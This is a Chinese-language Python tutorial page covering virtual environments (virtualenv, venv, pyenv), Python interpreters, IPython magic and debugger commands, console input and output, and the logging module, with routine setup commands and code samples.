showvirtualenv [env] 显示指定环境的详情
cpvirtualenv  [dest] 复制一份虚拟环境
allvirtualenv 对当前虚拟环境执行统一的命令
add2virtualenv [dir] [dir] 把指定的目录加入当前使用的环境的path中,这常使用于在多个project里面同时使用一个较大的库的情况
toggleglobalsitepackages -q 控制当前的环境是否使用全局的sitepackages目录

virtualenv-burrito
相当于 virtualenv + virtualenvwrapper ,不过只支持 python 2

autoenv
当进入到一个包含.env的目录,autoenv会自动激活该环境
pip install autoenv

【 venv 】
Python从3.3版本开始自带了一个虚拟环境venv,用来代替Python2使用的virtualenv,,很多操作都和virtualenv类似。
因为是从3.3版本开始自带的,这个工具也仅支持python3.3+版本,所以要在python2上使用虚拟环境依然要利用virtualenv

$ python3 -m venv -h
usage: venv [-h] [--system-site-packages] [--symlinks | --copies] [--clear]
            [--upgrade] [--without-pip] [--prompt PROMPT]
            ENV_DIR [ENV_DIR ...]
Creates virtual Python environments in one or more target directories.

positional arguments:
  ENV_DIR              A directory to create the environment in.
optional arguments:
  -h, --help              帮助信息
  --system-site-packages  给虚拟环境访问系统site-packages目录的权限
  --symlinks              当系统默认不是符号链接的方式时,尝试使用符号链接而不是复制。
  --copies                尝试使用复制而不是符号链接,即使符号链接是平台默认的方式。
  --clear                 在虚拟环境创建之前,删除已存在的虚拟环境目录。
  --upgrade               使用当前python,升级虚拟环境目录。
  --without-pip           跳过pip的升级或安装
  --prompt PROMPT         为该环境提供一个提示前缀

Once an environment has been created, you may wish to activate it, e.g. by
sourcing an activate script in its bin directory.

创建虚拟环境,以后在虚拟环境中所有的操作以及下载的库文件都会在这个文件夹中,创建的虚拟环境中python版本取决于是使用python还是python3来执行该命令
$ python3 -m venv /path/to/new/virtual/environment
$ python3 -m venv < DIR>
$ source < DIR>/bin/activate

不同平台激活虚拟环境方法
Platform    Shell   激活虚拟环境命令
Posix bash/zsh $ source < venv >/bin/activate
Posix fish $ . < venv >/bin/activate.fish
Posix csh/tcsh $ source < venv >/bin/activate.csh
Windows cmd.exe C:> < venv >\Scripts\activate.bat
Windows PowerShell  PS C:> < venv >\Scripts\Activate.ps1

使用deactivate命令即可退出虚拟环境,各平台一样,从虚拟环境中退出到系统环境是很明显的,因为前面的虚拟环境名称提示符消失了

venv建立的虚拟环境是轻量级的,如果要卸载或不用了,那么直接删除对应的虚拟环境文件夹即可,同时也删除了对应安装的包,这个补充了"便于包管理"的内容,可以用完即删

【 pyenv让python版本完美切换 】
使用pyenv和pyenv-virtualenv,在linux下完美隔离python各个版本

克隆pyenv仓库
git clone https://github.com/yyuu/pyenv.git ~/.pyenv

配置环境变量,将PYENV_ROOT和pyenv init加入bash的~/.bashrc
echo 'export PATH=~/.pyenv/bin:$PATH' >> ~/.bashrc
echo 'export PYENV_ROOT=~/.pyenv' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc

激活pyenv
source ~/.bashrc(在使用pyenv之前重新初始化shell环境:exec $SHELL,不执行该命令也是完全可以的,可以关闭当前的终端窗口重新启动一个就可以了)

常用命令
pyenv install --list # 列出可安装版本
pyenv install < version> # 安装对应版本
pyenv install -v < version> # 安装对应版本,若发生错误,可以显示详细的错误信息
pyenv versions # 显示当前使用的python版本
pyenv which python # 显示当前python安装路径
pyenv global < version> # 设置默认Python版本
pyenv local < version> # 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本
pyenv shell < version> # 当前shell的session中启用某版本,优先级高于global 及 local

安装pyenv-virtualenv,把插件克隆在刚才已经安装完毕的pyenv的plugins文件夹中
git clone https://github.com/pyenv/pyenv-virtualenv.git ~/.pyenv/plugins/pyenv-virtualenv

配置环境变量
echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc

在使用pyenv之前重新初始化shell环境,不执行该命令也是完全可以的,可以关闭当前的终端窗口,重新启动一个就可以
exec $SHELL

使用pyenv
检查安装是否正确
检查pyenv的版本
pyenv version

查看pyenv已经托管了哪些python版本
pyenv versions

如果看到了正常的版本信息就说明可以了,如果看到了类似于command not found之类的就说明安装失败了。

使用virtualenv
pyenv virtualenv env  # 从默认版本创建虚拟环境
pyenv virtualenv 3.6.4 env-3.6.4  # 创建3.6.4版本的虚拟环境
pyenv activate env-3.6.4  # 激活env-3.6.4这个虚拟环境
pyenv deactivate  # 停用当前的虚拟环境
# 自动激活,使用pyenv local虚拟环境名,会把`虚拟环境名`写入当前目录的.python-version文件中,关闭自动激活 -> pyenv deactivate,启动自动激活 -> pyenv activate env-3.6.4
pyenv local env-3.6.4
pyenv uninstall env-3.6.4  # 删除env-3.6.4这个虚拟环境

安装3.6.6版本的python
pyenv install 3.6.6
某些情况下会安装失败,报错提示Build failed,pyenv已在它的github wiki里准备了一篇错误应对方案:https://github.com/pyenv/pyenv/wiki
执行命令:sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev

安装完这些补充的工具之后,再次执行:
pyenv install 3.6.6
就可以成功了,可以不断的使用
pyenv versions
来查看被pyenv托管的python版本
而且想装什么版本就装什么版本,想装几个装几个,都是完美共存,完美隔离,可以在终端里输入
pyenv install
然后按下tab键就可以看到所有可选的安装版本了

使用刚才安装的python 3.6.6
首先需要明确一个概念,pyenv和pyenv-virtualenv是如何协作的,可以这么认为:
pyenv托管python版本,virtualenv使用python版本

第1步:创建虚拟环境
首先需要创建一个虚拟环境,执行命令:
pyenv virtualenv 3.6.6 my-env
它的格式就是这样固定的,最后一个是想要的环境的名字,可以随便取。稍等片刻将会看到:
Looking in links: /tmp/tmp0eywgc7v
Requirement already satisfied: setuptools in /home/joit/.pyenv/versions/3.6.6/envs/my-env/lib/python3.6/site-packages (39.0.1)
Requirement already satisfied: pip in /home/joit/.pyenv/versions/3.6.6/envs/my-env/lib/python3.6/site-packages (10.0.1)
类似于这样的回显信息,说明环境已经创建成功了,它还显示了该虚拟环境的绝对路径,如果进去看了就会发现,所谓的虚拟环境就是把python装在pyenv的安装目录的某个文件夹中,以供它自己调用。

第2步:激活虚拟环境
在任意目录下执行命令:pyenv activate my-env
终端里面多了一个类似于(my-env)这样的一个东西,这时候如果执行:python --version,那就是python 3.6.6了
如果执行:pip --version,显示pip包安装的绝对路径,也是pyenv安装目录下的某个文件夹
如果关掉了终端,那么下次启动又得重新激活一次了,可以使用如下命令:
首先cd到某一个目录,比如 ~/test
cd ~/test
然后在该目录下执行:pyenv local my-env
这时已经被激活了,那么local命令和刚才有啥不同呢。如果执行:ls -al就会发现在~/test目录下,有个隐藏文件.python-version,可以看到这个文件里面,只写了一句话my-env
这样只要进入~/test目录就会自动激活虚拟环境
在虚拟环境下如果直接执行命令python就会进入到python的交互环境
如果写了一个app.py文件,里面的内容只有一句代码:print(1)
然后执行:python app.py,这时系统就会调用虚拟环境中的python解释器来执行这些代码了

更新pyenv
由于是git克隆的,所以更新非常简单
cd ~/.pyenv
git pull

卸载pyenv
由于pyenv把一切都放在~/.pyenv下了,所以卸载很方便,两个步骤就行了
首先需要删除环境变量,然后需要执行:rm -rf ~/.pyenv 或者 rm -rf $(pyenv root)

</pre>
</div>

<div id="commandline">
<h4>运行Python</h4><pre>
编写Python代码时得到的是一个包含Python代码的以.py为扩展名的文本文件,要运行代码就需要Python解释器去执行.py文件。
由于整个Python语言从规范到解释器都是开源的,所以理论上只要水平够高任何人都可以编写Python解释器来执行Python代码,事实上确实存在多种Python解释器

1、CPython
从Python官方网站下载并安装好Python 3.x后就直接获得了一个官方版本的解释器：CPython,这个解释器是用C语言开发的,所以叫CPython。在命令行下运行python就是启动CPython解释器。CPython是使用最广的Python解释器

修改解释器提示符
>>> import sys
>>> sys.ps1
'>>> '
>>> sys.ps2
'... '
>>>
>>> sys.ps2 = '---------------- '
>>> sys.ps1 = 'Python编程时光>>>'
Python编程时光>>>for i in range(2):
---------------- print (i)
----------------
0
1

2、IPython
pip3 install ipython
IPython是基于CPython之上的一个交互式解释器,即IPython只是在交互方式上有所增强,但执行Python代码的功能和CPython完全一样。好比很多国产浏览器虽然外观不同,但内核都是调用了IE。
CPython用>>>作为提示符,而IPython用In [序号]:作为提示符。
安装完成之后在命令提示符下输入ipython就可以启动ipython
其与原版python命令行工具不同在于ipython的提示符变成了in和out,in为输入命令的地方,out为命令执行完成后输出的地方

ipython的特点
tab键自动补全一些常用的方法
支持一些系统命令,如pwd,cd
执行系统命令(!),如!ifconfig、!ip a、!cat /etc/sysconfig/selinux、!vim hello.py
?命令(内省,命令空间搜索),如var_name?表示查看var_name变量或对象相关的通用信息
??命令,在函数名后添加两个问号则可以显示该函数相关的源代码
%run命令执行文件代码,如%run "hello.py"
%paste和%cpaste命令执行剪帖板代码
使用上箭头或下箭头可以查看上一条命令或下一条命令的历史
_执行前面倒数第一条命令,__,_i48执行第48条命令

目录书签系统%bookmark
In [55]: %bookmark local /usr/local         # 定义local书签
In [56]: %bookmark selinux /etc/sysconfig/selinux   # 定义selinux书签
In [57]: %bookmark -l       # 显示所有的书签
Current bookmarks:
local   -> /usr/local
selinux -> /etc/sysconfig/selinux
In [55]: %bookmark local /usr/local
In [56]: %bookmark sysconfig /etc/sysconfig
In [57]: %bookmark -l
Current bookmarks:
local   -> /usr/local
sysconfig -> /etc/sysconfig
In [58]: pwd
Out[58]: '/'
In [59]: cd local
(bookmark:local) -> /usr/local
/usr/local
In [60]: pwd
Out[60]: '/usr/local'
In [61]: cd sysconfig
(bookmark:sysconfig) -> /etc/sysconfig
/etc/sysconfig
In [62]: pwd
Out[62]: '/etc/sysconfig'

ipython常用的魔术命令
%quickref                   显示ipython的快速参考
%magic                      显示所有的魔术命令的详细文档
%debug                      启动调试器并自动跳转到异常代码,输入q命令退出调试器
%hist                       打印命令的输入(可选输出)历史
%pdb                        在异常发生后自动进入调试器
%paste                      执行剪贴板中的python代码
%cpaste                     打开一个特殊提示符以便手工粘贴待执行的python代码
%reset                      删除interactive命名空间中的全部变量/名称
%page OBJECT                通过分页器打印输出object
%run script.py              在ipython中执行一个python脚本文件
%prun statement             通过cprofile执行statement,并打印分析器的输出结果
%time statement             报告statement的执行时间
%timeit statement           多次执行statement以计算系统平均执行时间.对那么执行时间非常小的代码很有用
%who,%who_id,%whos          显示interactive命名空间中定义的变量,信息级别/冗余度可变
%xdel variable              删除variable,并尝试清除其在ipython中的对象上的一切引用

单步执行
使用带-d选项的%run命令可以预先打开调试器,输入s单步进入函数调用,输入n命令执行到下一行代码,输入叹号!紧接着输入变量名可查看变量的值
这条命令如果再添加一个指定行号的选项(-b)即可在启动调试器时设置一个断点

python调试器命令
h(help)                 显示命令列表
help command            显示command的文档
c(continue)             恢复程序的执行
q(quit)                 退出调试器,不再执行任何代码
b(break) n              在当前文件的第n行设置一个断点
b path/to/file.py:n     在指定文件的第n行设置一个断点
s(step)                 单步进入函数调用
n(next)                 执行当前行,并前进到当前级别的下一行
u(up)/d(down)           在函数调用栈中向上或向下移动
a(args)                 显示当前函数的参数
debug statement         在新的递归调试器中调用语句statement
l(list) statement       显示当前行,以及当前栈级别上的上下文参考代码
w(where)                打印当前位置的完整栈跟踪(包括上下文参考代码)

ipython快捷键
Ctrl+p或者向上键头           向后搜索命令历史中以当前输入的文本开头的命令
Ctrl+n或者向上键头           向前搜索命令历史中以当前输入的文本开头的命令
Ctrl+r                      按行读取的反向历史搜索(部分匹配)
Ctrl+Shift+variable         从剪贴板粘贴文本
Ctrl+c                      中止当前正在执行的代码
Ctrl+a                      把光标移动到行首
Ctrl+e                      把光标移动到行尾
Ctrl+k                      删除从光标开始到行尾的文本
Ctrl+u                      清除当前行的所有内容
Ctrl+f                      将光标向前移动一个字符
Ctrl+b                      将光标向后移动一个字符
Ctrl+l                      清屏

3、PyPy
PyPy是另一个Python解释器,它的目标是执行速度。PyPy采用JIT技术,对Python代码进行动态编译,不是解释,所以可以显著提高Python代码的执行速度。
绝大部分Python代码都可以在PyPy下运行,但是PyPy和CPython有一些不同,这就导致相同的Python代码在两种解释器下执行可能会有不同的结果

4、Jython
Jython是运行在Java平台上的Python解释器,可直接把Python代码编译成Java字节码执行。
如果要和Java或.Net平台交互,最好的办法不是用Jython或IronPython,而是通过网络调用来交互,确保各程序之间的独立性。

5、IronPython
IronPython和Jython类似,只不过IronPython是运行在微软.Net平台上的Python解释器,可以直接把Python代码编译成.Net的字节码。

Python命令行参数:
python [-bBdEhiIOqsSuvVWx?] [-c command | -m module-name | script | - ] [args]
-d  在解析时显示调试信息
-O  生成优化代码(.pyo文件)
-S  启动时不引入查找Python路径的位置
-V  输出Python版本号
-X  从1.6版本之后基于内建的异常(仅仅用于字符串)已过时。
-c cmd  执行Python脚本,并将运行结果作为cmd字符串。
file  在给定的python文件执行python脚本。

1、当调用时附带连接到某个tty设备的标准输入时,它会提示输入命令并执行它们,直到读入一个 EOF即文件结束字符,其产生方式是在UNIX中按Ctrl-D或在Windows中按Ctrl-Z,Enter
2、当调用时附带一个文件名参数或以一个文件作为标准输入时,它会从该文件读取并执行脚本程序。
3、当调用时附带一个目录名参数时,它会从该目录读取并执行具有适当名称的脚本程序。
4、当调用时附带-c command时会执行command所给出的Python语句。command可以包含以换行符分隔的多条语句
5、当调用时附带-m module-name时会在Python模块路径中查找指定的模块,并将其作为脚本程序执行。

python scriptname.py
执行scriptname.py中的Python代码,该参数应为一个文件系统路径,指向某个Python文件、包含__main__.py文件的目录,或包含__main__.py文件的zip文件。
如果给出此选项,sys.argv 的首个元素将为在命令行中指定的脚本名称。
如果脚本名称直接指向一个Python文件,则包含该文件的目录将被加入sys.path的开头,并且该文件会被作为__main__模块来执行。
如果脚本名称指向一个目录或zip文件,则脚本名称将被加入sys.path的开头,并且该位置中的__main__.py文件会被作为__main__模块来执行

1、交互式解释器(交互模式 interactive mode):
可通过命令行窗口进入python并开在交互式解释器中编写Python代码,在Python交互模式下输入exit()回车就退出Python交互模式回到命令行模式,或可以通过quit()或Ctrl+D

解释器的行编辑功能也包括交互式编辑,在支持readline的系统中,可以回看历史命令,也有Tab代码补全功能。要想快速检查是否支持行编辑,在出现提示符后按键盘Control-P

$ python3.7
Python 3.7 (default, Sep 16 2015, 09:25:04)
[GCC 4.8.2] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> the_world_is_flat = True
>>> if the_world_is_flat:
...     print("Be careful not to fall off!")
...
Be careful not to fall off!
>>> 1+3
4
>>> print('hello, world')
hello, world
>>> import this

2、命令行脚本
在应用程序中通过引入解释器可以在命令行中执行Python脚本
C:>python script.py
C:>python -h

另一种启动解释器的方式是python -c command [arg] ...,其中command要换成想执行的指令,就像命令行的-c选项。由于Python代码中经常会包含对终端来说比较特殊的字符,通常情况下都建议用英文单引号把command括起来。
python -c "import math"
python -c "import sys;print(sys.modules)

有些Python模块也可以作为脚本使用。可以这样输入:python -m module [arg] ...这会执行module的源文件,就跟在命令行把路径写全了一样。

在运行脚本的时候,有时可能也会需要在运行后进入交互模式。这种时候在文件参数前加上选项-i就可以了

传入参数
如果可能的话,解释器会读取命令行参数,转化为字符串列表存入sys模块中的argv变量中。执行命令import sys可导入这个模块并访问这个列表。这个列表最少也会有一个元素;如果没有给定输入参数,sys.argv[0]就是个空字符串。如果脚本名是标准输入,sys.argv[0]就是'-'。使用-c command时sys.argv[0]就会是 '-c'。如果使用选项-m module,sys.argv[0]就是包含目录的模块全名。在-c command或-m module之后的选项不会被解释器处理,而会直接留在sys.argv中给命令或模块来处理。

像.exe文件直接运行py文件
在Windows上是不行的,但在Mac和Linux上可以,方法是在.py文件的第一行加上一个特殊的注释:#!/usr/bin/env python3
然后通过命令给hello.py以执行权限:$ chmod a+x hello.py
$./hello.py就可以直接运行hello.py

直接输入python进入交互模式,相当于启动了Python解释器,但等待一行一行地输入源代码,每输入一行就执行一行。
直接运行.py文件相当于启动了Python解释器,然后一次性把.py文件的源代码给执行了,没有机会以交互的方式输入源代码的

3、集成开发环境(IDE:Integrated Development Environment): PyCharm
PyCharm是由JetBrains打造的一款Python IDE,支持macOS、 Windows、 Linux系统。
PyCharm功能:调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制……

</pre>执行Python程序<textarea>
//Python2.0+
#!/usr/bin/python
print "Hello, World!"

//Python3.0+版本已经把print作为一个内置函数
#!/usr/bin/python3
print("Hello, World!")

</textarea><pre>
【 单下划线 _ 】
按照习惯单个独立下划线是用作一个名字来表示某个变量是临时的或无关紧要的,如下面的循环中不需要访问正在运行的索引就可使用"_"来表示它只是一个临时值
for _ in range(10): print('Hello, World.')

也可以在拆分(unpacking)表达式中将单个下划线用作"不关心的"变量以忽略特定的值,"_"作为占位符变量使用同样这个含义只是"依照约定",并不会在Python解释器中触发特殊的行为。单个下划线仅仅是一个有效的变量名称,会有这个用途而已。
>>> car = ('red', 'auto', 12, 3812.4)
>>> color, _, _, mileage = car
>>> color
'red'
>>> mileage
3812.4
>>> _
12

除用作临时变量外,"_"是大多数Python REPL中的一个特殊变量,它表示由解释器评估的最近一个表达式的结果,这样可以在一个解释器会话中访问先前计算的结果,或动态构建多个对象并与它们交互,无需事先给这些对象分配名字

>>> 20 + 3
23
>>> _
23
>>> print(_)
23
>>> list()
[]
>>> _.append(1)
>>> _.append(2)
>>> _
[1, 2]

【 dir()和help()帮助函数 】
Python不需要用户查询文档,只需掌握如下两个帮助函数即可查看Python中的所有函数(方法)以及它们的用法和功能:
dir():列出指定类或模块包含的全部内容(包括函数、方法、类、变量等)。
help():查看某个函数或方法的帮助文档。

>>> dir(str)        # 列出了字符串类型(str)提供的所有方法,其中以"_"开头、"_"结尾的方法被约定成私有方法,不希望被外部直接调用
>>> help(str.title) # 查看某个方法的用法

【 输出 】
最简单的输出方法是用print()打印到屏幕,可给它传递零或多个用逗号隔开的表达式,此函数把传递的表达式转换成一个字符串表达式,并将结果写到标准输出

语法
print(*objects, sep=' ', end='\n', file=sys.stdout, flush=False)
将objects打印到file指定的文本流,以sep分隔并在末尾加上end。sep、end、file和flush如果存在,它们必须以关键字参数的形式给出
所有非关键字参数都会被转换为字符串,就像是执行了str()一样,并会被写入到流,以sep且在末尾加上end。 sep和end都必须为字符串,也可以为None表示使用默认值。如果没有给出objects则print()将只写入end
file参数必须是一个具有write(string)方法的对象;如果参数不存在或为None则将使用sys.stdout。 由于要打印的参数会被转换为文本字符串,因此print()不能用于二进制模式的文件对象,对于这些对象应改用file.write(...)
输出是否被缓存通常决定于file,但如果flush关键字参数为真值,流会被强制刷新

>>> print('hello, world')

print()可接受多个字符串或变量,默认用逗号","隔开,每个字符串或变量值连成一串输出,逗号输出一个空格,如要改变默认的分隔符可通过sep参数指定分隔符
print('The quick brown fox', 'jumps over', 'the lazy dog') # The quick brown fox jumps over the lazy dog
user_name = 'Charlie'
user_age = 8
print("读者名:",user_name,"年龄:",user_age)  # 读者名: Charlie 年龄: 8
print("读者名:" ,user_name,"年龄:",user_age,sep='|')  # 读者名:|Charlie|年龄:|8

print()也可以打印整数或计算结果:
>>> print(300)  # 300
>>> print(100 + 200)  # 300
>>> print('100 + 200 =', 100 + 200)  # 100 + 200 = 300

默认print()输出之后总会换行,因为end参数的默认"\n"代表换行可通过重设end参数设置
print(40,'\t',end="")
print(50,'\t',end="")
print(60,'\t',end="")
上面三条print()语句会执行三次输出,但由于它们都指定了end="",因此每条print()语句的输出都不会换行,依然位于同一行

file参数指定print()的输出目标,file参数默认sys.stdout代表系统标准输出即默认输出到屏幕,可通过改变该参数让print()输出到特定文件中
f = open("demo.txt", "w")  # 打开文件以便写入
print('沧海月明珠有泪', file=f)
print('蓝回日暖玉生烟', file=f)
f.close()

print()函数的flush参数用于控制输出缓存,该参数一般保持为False即可,这样可以获得较好的性能

【 刷新输出 】
</pre><textarea>
import time

for i in range(20):
    print('#', end="")

print()

for i in range(20):
    print('#', end="", flush=True)
    time.sleep(0.1)

print()

days = 20
for i in range(days):
    print("\r进度百分比：{0}%".format(round((i+1)*100/days)), end="", flush=True) # 使用\r这个转义字符做到每次都回到开头
    time.sleep(0.1)

</textarea>python的stdout是有缓冲区的,sys.stdout.flush()函数的作用是刷新输出<textarea>
import time
import sys

for i in range(5):
    print(i,end=' ')
    sys.stdout.flush()
    time.sleep(1)
print()

</textarea><pre>
程序本意是每隔一秒输出一个数字,但如果把sys.stdout.flush()注释就只能等到程序执行完毕,屏幕上会一次性输出0,1,2,3,4。
如果加上sys.stdout.flush(),刷新stdout,这样就能每隔一秒输出一个数字了。
可以用在网络程序中多线程程序,多个线程后台运行,同时要能在屏幕上实时看到输出信息

</pre><textarea>
import time
import sys

for i in range(101):
    sys.stdout.write('\r>> Downloading %s %.1f%%' % ('filename.zip', float(i))) # 换成print会输出100行
    sys.stdout.flush()
    time.sleep(0.1)
print()

</textarea><pre>
【 读取键盘输入 】
input([prompt])
接收一个Python表达式作为输入并将运算结果返回
如果存在prompt实参则将其写入标准输出,末尾不带换行符。接下来该函数从输入中读取一行,将其转换为除了末尾的换行符的字符串并返回。当读取到EOF时则触发EOFError

Python提供了一个input()可以让用户输入字符串,并存放到一个变量里。比如输入用户的名字:
>>> name = input()
Michael

输入name = input()并按下回车后,Python交互式命令行就在等待输入了,这时可以输入任意字符,然后按回车后完成输入。
输入完成后,不会有任何提示,Python交互式命令行又回到>>>状态了。刚才输入的内容存放到name变量里了,可以直接输入name查看变量内容:
>>> name
'Michael'

input()可以传入一个用于提示的字符串参数
name = input('please enter your name: ')
name = input('please enter your password: \n')
print('hello,', name)

input("按下enter键退出,其他任意键显示...\n")     # 等待用户输入,\n实现换行,一旦用户按下enter(回车)键退出,其它键显示

</pre>价值一个亿的AI核心代码<textarea>
while True:
    print(input('').replace('吗','').replace('？','！'))

在吗？
在！
你好
你好
会python吗？
会python！

</textarea>无论输入哪种内容,input()函数始终返回字符串,程序总会将用户输入的内容转换成字符串<textarea>
msg = input("请输入:")
print (type(msg))
print("输入的内容是: ", msg)

'''
请输入:haha
< class 'str'>
输入的内容是:  haha

请输入:[x*5 for x in range(2,10,2)]
< class 'str'>
输入的内容是:  [10, 20, 30, 40]

请输入:2
< class 'str'>
输入的内容是:  2
'''

num = int(input('输入数值: '))

</textarea>
</div>

<div id="logging">
<h4>使用logging模块调试代码</h4><pre>
把print()替换为logging,logging不会抛出错误,而且可以输出到文件
允许指定记录信息的级别,有debug、info、warning、error等几个级别,当指定level=INFO时logging.debug就不起作用了,指定level=WARNING后debug和info就不起作用了。这样一来可以放心地输出不同级别的信息,也不用删除,最后统一控制输出哪个级别的信息。
logging的另一个好处是通过简单的配置,一条语句可以同时输出到不同的地方,比如console和文件

print([e for e in dir(logging) if not e.startswith('_')])
['BASIC_FORMAT', 'BufferingFormatter', 'CRITICAL', 'DEBUG', 'ERROR', 'FATAL', 'FileHandler', 'Filter', 'Filterer', 'Formatter', 'Handler', 'INFO', 'LogRecord', 'Logger', 'LoggerAdapter', 'Manager', 'NOTSET', 'NullHandler', 'PercentStyle', 'PlaceHolder', 'RootLogger', 'StrFormatStyle', 'StreamHandler', 'StringTemplateStyle', 'Template', 'WARN', 'WARNING', 'addLevelName', 'atexit', 'basicConfig', 'captureWarnings', 'collections', 'critical', 'currentframe', 'debug', 'disable', 'error', 'exception', 'fatal', 'getLevelName', 'getLogRecordFactory', 'getLogger', 'getLoggerClass', 'info', 'io', 'lastResort', 'log', 'logMultiprocessing', 'logProcesses', 'logThreads', 'makeLogRecord', 'os', 'raiseExceptions', 'root', 'setLogRecordFactory', 'setLoggerClass', 'shutdown', 'sys', 'threading', 'time', 'traceback', 'warn', 'warning', 'warnings', 'weakref']

</pre><textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import logging
logging.basicConfig(level=logging.INFO)

s = '0'
n = int(s)
logging.info('n = %d' % n)
print(10 / n)

$ ./hello.py
INFO:root:n = 0
Traceback (most recent call last):
  File "./hello.py", line 10, in < module>
    print(10 / n)
ZeroDivisionError: division by zero

</textarea><textarea>
import logging

logging.debug('debug message')
logging.info('info message')
logging.warning('warning message')
logging.error('error message')
logging.critical('critical message')

"""
WARNING:root:warning message
ERROR:root:error message
CRITICAL:root:critical message
"""

</textarea><pre>
日志级别
Python标准库logging用作记录日志,默认分为六种日志级别(括号为级别对应的数值),NOTSET(0)、DEBUG(10)、INFO(20)、WARNING(30)、ERROR(40)、CRITICAL(50)。自定义日志级别时注意不要和默认的日志级别数值相同,logging执行时输出大于等于设置的日志级别的日志信息,如设置日志级别是INFO则INFO、WARNING、ERROR、CRITICAL级别的日志都会输出。

在引入有日志输出的python文件时,如import test.py,在满足大于当前设置的日志级别后就会输出导入文件中的日志

logging使用非常简单,使用basicConfig()方法就能满足基本的使用需要,如果方法没有传入参数,会根据默认的配置创建Logger对象,默认的日志级别被设置为WARNING,默认Python的logging模块将日志打印到标准输出,且只显示了大于等于WARNING级别的日志,这说明默认的日志级别设置为WARNING(日志级别等级CRITICAL > ERROR > WARNING > INFO > DEBUG > NOTSET),默认的日志格式为日志级别:Logger名称:用户输出消息即WARNING:root:warn message

logging.basicConfig()函数中可通过具体参数来更改logging模块默认行为,可用参数有:
filename:用指定的文件名创建FiledHandler,这样日志会被存储在指定的文件中。
filemode:文件打开方式,在指定了filename时使用这个参数,默认值为"a"还可指定为"w",r[+]、w[+]、a[+]
format:指定handler使用的日志输出显示格式。
datefmt:指定日志附带日期时间格式。
style:格式占位符,默认为"%"和"{}"
level:设置日志输出级别
stream:定义输出流,用来初始化StreamHandler对象,不能filename参数一起使用,否则会ValueError异常,指定的stream创建StreamHandler,可指定输出到sys.stderr,sys.stdout或文件(f=open('test.log','w'),默认为sys.stderr
handles:定义处理器,用来创建Handler对象,不能和filename 、stream参数一起使用,否则也会抛出ValueError异常

format参数中可能用到的格式化串:
%(name)s 日志对象Logger的名字
%(levelno)s 数字形式的日志级别
%(levelname)s 文本形式的日志级别名称
%(pathname)s 调用日志输出函数的模块的完整路径名,可能没有(包含路径)
%(filename)s 调用日志输出函数的模块的文件名(不包含路径)
%(module)s 调用日志输出函数的模块名
%(funcName)s 调用日志输出函数的函数名
%(lineno)d 调用日志输出函数的语句所在的代码行号
%(created)f 当前时间,用UNIX标准的表示时间的浮点数表示
%(relativeCreated)d 输出日志信息时的,自Logger创建以来的毫秒数
%(asctime)s 字符串形式的当前时间,默认格式是"2003-07-08 16:49:45,896",逗号后面的是毫秒,可额外指定datefmt参数来指定该变量的格式
%(thread)d 当前线程ID,可能没有
%(threadName)s 当前线程名,可能没有
%(process)d 当前进程ID,可能没有
%(processName)d 当前进程名称,可能没有
%(message)s 具体的日志信息

</pre><textarea>
import logging

logging.basicConfig()
logging.debug('This is a debug message')
logging.info('This is an info message')
logging.warning('This is a warning message')
logging.error('This is an error message')
logging.critical('This is a critical message')

# 输出结果如下：
WARNING:root:This is a warning message
ERROR:root:This is an error message
CRITICAL:root:This is a critical message

</textarea><textarea>
import logging

logging.basicConfig(
    filename="test.log",
    filemode="w",
    format="%(asctime)s %(name)s:%(levelname)s:%(message)s",
    datefmt="%d-%M-%Y %H:%M:%S",
    level=logging.DEBUG
)
logging.debug('This is a debug message')
logging.info('This is an info message')
logging.warning('This is a warning message')
logging.error('This is an error message')
logging.critical('This is a critical message')

# 生成的日志文件 test.log ,内容如下：
13-10-18 21:10:32 root:DEBUG:This is a debug message
13-10-18 21:10:32 root:INFO:This is an info message
13-10-18 21:10:32 root:WARNING:This is a warning message
13-10-18 21:10:32 root:ERROR:This is an error message
13-10-18 21:10:32 root:CRITICAL:This is a critical message

</textarea>灵活配置日志级别,日志格式,输出位置<textarea>
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
    datefmt='%a, %d %b %Y %H:%M:%S',
    filename='/tmp/test.log',
    filemode='w'
)

logging.debug('debug message')
logging.info('info message')
logging.warning('warning message')
logging.error('error message')
logging.critical('critical message')

查看输出:
cat /tmp/test.log 
Mon, 05 May 2018 16:29:53 test_logging.py[line:9] DEBUG debug message
Mon, 05 May 2018 16:29:53 test_logging.py[line:10] INFO info message
Mon, 05 May 2018 16:29:53 test_logging.py[line:11] WARNING warning message
Mon, 05 May 2018 16:29:53 test_logging.py[line:12] ERROR error message
Mon, 05 May 2018 16:29:53 test_logging.py[line:13] CRITICAL critical message

</textarea>但当发生异常时,直接使用无参数的debug()、info()、warning()、error()、critical()方法并不能记录异常信息,需要设置exc_info参数为True才可以,或者使用exception()方法,还可以使用log()方法,但还要设置日志级别和exc_info参数。<textarea>
import logging

logging.basicConfig(filename="test.log", filemode="w", format="%(asctime)s %(name)s:%(levelname)s:%(message)s", datefmt="%d-%M-%Y %H:%M:%S", level=logging.DEBUG)
a = 5
b = 0
try:
    c = a / b
except Exception as e:
    # 下面三种方式三选一,推荐使用第一种
    logging.exception("Exception occurred")
    logging.error("Exception occurred", exc_info=True)
    logging.log(level=logging.DEBUG, msg="Exception occurred", exc_info=True)

</textarea><pre>
【 自定义Logger 】
一个系统只有一个Logger对象,并且该对象不能被直接实例化,这里用到了单例模式,这里的单例模式并不是说只有一个Logger对象,而是指整个系统只有一个根Logger对象,Logger对象在执行info()、error()等方法时实际上调用都是根Logger对象对应的info()、error()等方法。

获取Logger对象的方法为getLogger。
logging.getLogger([name])返回一个logger对象,如果没有指定名字将返回root logger

可以创造多个Logger对象,但真正输出日志的是根Logger对象。每个Logger对象都可以设置一个名字,如果设置logger=logging.getLogger(__name__),__name__是Python中的一个特殊内置变量,代表当前模块的名称(默认为__main__)。则Logger对象的name为建议使用使用以点号作为分隔符的命名空间等级制度。

Logger对象可以设置多个Handler对象和Filter对象,Handler对象又可以设置Formatter对象,Formatter对象用来设置具体的输出格式

